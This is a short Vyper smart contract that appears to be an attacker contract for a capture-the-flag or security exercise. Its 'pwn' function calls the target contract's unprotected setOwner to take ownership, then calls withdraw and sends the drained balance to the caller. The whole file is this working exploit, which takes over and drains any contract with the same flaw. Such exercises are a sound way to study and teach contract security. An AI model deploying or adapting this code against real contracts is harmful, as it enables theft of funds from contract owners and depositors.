# @version ^0.3.7


interface Target:
    def withdraw(): nonpayable
    def setOwner(owner: address): nonpayable


target: public(Target)


@external
def __init__(target: address):
    self.target = Target(target)


@external
@payable
def __default__():
    pass

@external
def pwn():
    self.target.setOwner(self)
    self.target.withdraw()
    send(msg.sender, self.balance)